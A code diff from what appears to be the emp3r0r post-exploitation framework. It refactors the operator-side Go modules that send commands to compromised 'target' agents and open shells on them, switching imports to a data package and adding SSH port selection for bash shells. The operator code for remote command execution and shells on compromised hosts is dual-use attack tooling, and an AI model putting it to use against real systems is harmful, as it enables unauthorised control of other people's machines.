@@ -5,7 +5,7 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
 // RShellStatus stores errors from reverseBash
@@ -14,13 +14,13 @@ var RShellStatus = make(map[string]error)
 // moduleCmd exec cmd on target
 func moduleCmd() {
 	// send command
-	execOnTarget := func(target *agent.SystemInfo) {
+	execOnTarget := func(target *emp3r0r_data.SystemInfo) {
 		if Targets[target].Conn == nil {
 			CliPrintError("moduleCmd: agent %s is not connected", target.Tag)
 			return
 		}
-		var data agent.MsgTunData
-		data.Payload = "cmd" + agent.OpSep + Options["cmd_to_exec"].Val
+		var data emp3r0r_data.MsgTunData
+		data.Payload = "cmd" + emp3r0r_data.OpSep + Options["cmd_to_exec"].Val
 		data.Tag = target.Tag
 		err := Send2Agent(&data, target)
 		if err != nil {
@@ -69,6 +69,12 @@ func moduleShell() {
 	// options
 	shell := Options["shell"].Val
 	port := Options["port"].Val
+	if shell == "bash" {
+		port = emp3r0r_data.SSHDPort
+	} else if port == emp3r0r_data.SSHDPort {
+		CliPrintError("Port %s already has a bash shell at service, choose a different one", port)
+		return
+	}
 
 	// run
 	err := SSHClient(shell, port)
